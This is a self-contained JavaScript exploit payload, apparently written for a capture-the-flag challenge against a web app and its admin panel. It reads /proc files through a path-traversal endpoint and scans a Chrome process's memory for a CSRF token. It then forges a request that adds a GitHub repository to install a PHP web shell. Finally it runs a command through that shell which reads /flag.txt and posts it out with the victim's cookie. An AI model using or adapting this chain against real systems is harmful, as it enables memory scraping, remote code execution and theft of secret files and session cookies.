(async()=>{
const REPO={platform:'github',name:'2ash1/static',repositoryUrl:'https://github.com/2Ash1/static',branch:'main'};
const SHELL='http://admin-app/packages/2ash1/static/index.php';
const post=t=>fetch('/edit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(t.replace(/[^A-Za-z0-9 !.:()]/g,' '))});
const r=p=>fetch('/profile'+p+'%3f',{cache:'no-store'}).then(x=>x.text()).catch(e=>'');
const cmd=()=>{
 let ck=document.cookie.split(';')[0];
 return `curl -s -X POST http://app/edit -H "Cookie: ${ck}" --data title=flag --data-urlencode content="$(python3 -c 'print(open(\"/flag.txt\",\"rb\").read().hex())')"`;
};
const install=csrf=>{
 post('csrf '+csrf.slice(0,16));
 let w=open('about:blank','amcsrf');
 let f=document.createElement('form');
 f.method='POST';
 f.action='http://admin-app/_api/package-manager/add-repository';
 f.target='amcsrf';
 let a=(k,v)=>{let i=document.createElement('input');i.name=k;i.value=v;f.appendChild(i)};
 a('__csrf__',csrf);
 a('__json__',JSON.stringify(REPO));
 document.body.appendChild(f);
 f.submit();
 setTimeout(()=>{location.href=SHELL+'?cmd='+encodeURIComponent(cmd())},25000);
};
post('stage start');
for(let pid=1;pid<900;pid++){
 let c=await r('/proc/'+pid+'/cmdline');
 if(!/chrome|chromium/i.test(c))continue;
 post('pid '+pid);
 let m=await r('/proc/'+pid+'/maps');
 for(let line of m.split('\n')){
  let q=line.split(/\s+/),x=q[0],perm=q[1]||'',name=q[5]||'';
  if(!x||!perm.includes('r')||!perm.includes('w'))continue;
  if(name&&name!='[heap]')continue;
  let [s,e]=x.split('-').map(v=>parseInt(v,16));
  if(!s||!e||e<=s||e-s>0x2000000)continue;
  for(let off=s;off<e;off+=0x500){
   let d=await r('/proc/'+pid+'/mem?offset=0x'+off.toString(16)+'&limit=1500');
   if(d.includes('csrf')){
    let z=d.match(/[a-f0-9]{64}/);
    if(z){install(z[0]);return}
   }
  }
 }
}
post('csrf not found');
})();
